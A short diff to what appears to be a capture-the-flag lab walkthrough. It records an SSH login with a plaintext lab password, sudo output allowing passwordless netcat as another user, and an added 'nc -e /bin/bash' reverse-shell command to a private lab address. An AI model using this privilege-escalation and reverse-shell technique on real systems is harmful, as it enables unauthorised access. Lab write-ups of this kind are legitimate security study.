@@ -45,5 +45,6 @@ sophia/seemstobeimpossible
 ┌──(kali㉿kali)-[~/下载]
 └─$ ssh alicia@192.168.44.136 //ihaveadream
 
-sudo -l //
+sudo -l //  (emma) NOPASSWD: /usr/bin/nc
+sudo -u emma /usr/bin/nc -e /bin/bash 192.168.44.136 2333
 ```
